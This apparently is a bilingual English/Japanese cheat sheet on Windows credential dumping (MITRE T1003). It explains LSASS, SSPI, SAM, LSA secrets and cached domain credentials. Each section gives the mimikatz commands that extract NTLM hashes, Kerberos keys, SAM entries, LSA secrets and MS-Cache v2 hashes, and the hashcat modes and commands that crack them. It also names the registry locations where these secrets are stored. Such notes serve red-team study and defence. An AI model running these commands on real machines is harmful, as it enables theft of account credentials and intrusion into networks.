OS Credential Dumping is a technique [[T1003](https://attack.mitre.org/techniques/T1003/)] where an adversary extracts credential material, that are either stored or cached, from the Operating System.

## LSASS Memory
The Local Security Authority Subsystem Service (LSASS) on Windows is responsible for  verifying the credentials of users when logging in, handling password changes, creating access tokens, and so on.
### SSPI
Security Support Provider Interface (SSPI) は、Microsoftが提供するWindows認証の共通インターフェースで、Generic Security Services Application Program Interface (GSSAPI) のWindows版実装


システム起動時に各種SSPのDLLが読み込まれる
- SSPs一覧
	- NTLM : msv1_0.dll
	- Kerberos : kerberos.dll
	- Digest : wdigest.dll
	- Schannel : schannel.dll
	- CredSSP : credssp.dll
### NTLM Hashes
NTLM dump command
```
mimikatz sekurlsa::logonpasswords
```
These can be cracked using hash mode 1000 in Hashcat.
```
hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
```
### Kerberos Keys
dump user's Kerberos encryption keys.
```
mimikatz sekurlsa::ekeys
```

> [!WARNING]
> mimikatzはkey listを`des_cbc_md4`としているが、実際は長さが64の場合は`aes256-cts-hmac-sha1-96`であることに注意

crack AES256
```
hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rul
```
## Security Account Manager
ローカルユーザーアカウントとグループを管理するためのデータベース
主にローカルPC（スタンドアロンやワークグループ環境）でユーザー名とパスワードハッシュを保存・認証に使う

SAMデータベースはレジストリHive形式（バイナリ構造）
- キー階層
	- ユーザー名一覧 : `SAM\Domains\Account\Users\Names`
	- ユーザーの詳細 : `SAM\Domains\Account\Users<RID>`

```
mimikatz !lsadump::sam
```
## LSA Secrets
LSA secrets is another piece of protected storage used by the Local Security Authority (LSA).  It can be a bit of a mish-mash as to what's kept in here, but common candidates include service accounts passwords, the machine's domain account password, and EFS encryption keys.

LSAシークレットはレジストリ or メモリからダンプ可能
- レジストリ：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`
- 復号キー：`HKLM/Security/Policy`
### Local Security Authority (LSA)
Local Security Authority (LSA) とは、Windowsオペレーティングシステムのセキュリティの中心的なサブシステムで、lsass.exe（Local Security Authority Subsystem Service）というプロセスとして動作するコンポーネント

automatically fetch and decrypt the secrets
```
mimikatz !lsadump::secrets
```

## Cached Domain Credentials
Windows computers that have been joined to a domain often cache domain logon information after a user has logged in.

保管場所
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`

ハッシュ形式
- MS-Cache v2

they must be extracted and cracked offline
```
mimikatz !lsadump::cache
```

```
hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
```